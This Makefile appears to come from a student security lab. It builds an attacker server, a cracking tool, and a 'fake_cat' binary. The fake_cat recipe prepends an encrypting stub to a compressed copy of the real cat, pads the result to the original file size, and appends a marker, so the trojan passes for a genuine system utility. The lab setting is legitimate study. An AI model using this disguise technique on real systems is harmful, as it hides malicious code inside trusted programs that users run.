APP_SEV=attacker_server
APP_SEV_FILE=attacker_server.py

APP_CRK=crack_attack
APP_CRK_FILE=crack_attack.py

all: $(APP_SEV) $(APP_CRK) fake_cat
	echo "Build finished!"

fake_cat: encrypt_code cat
	cat cat | xz > cat.xz
	cat encrypt_code \
		| perl -pe "s/MK1/$$(cat encrypt_code | wc -c | tr -d ' ')/" \
		| perl -pe "s/MK2/$$(cat cat.xz | wc -c | tr -d ' ')/" \
		> fake_cat
	cat cat.xz >> fake_cat
	perl -e "print(\"\x00\" x $$(($$(cat cat | wc -c) - $$(cat fake_cat | wc -c) - 4)))" >> fake_cat
	perl -e 'print("\xaf\xbe\xad\xde")' >> fake_cat
	chmod +x fake_cat
	rm cat.xz

$(APP_SEV): $(APP_SEV_FILE)
	cp $(APP_SEV_FILE) $(APP_SEV)
	chmod +x $(APP_SEV)

$(APP_CRK): $(APP_CRK_FILE)
	cp $(APP_CRK_FILE) $(APP_CRK)
	chmod +x $(APP_CRK)

clean:
	rm -f $(APP_SEV) $(APP_CRK) fake_cat cat.xz

zip:
	zip 0816153.zip Makefile $(APP_CRK_FILE) $(APP_SEV_FILE) encrypt_code && \
	echo "\nZip file successfully build!"
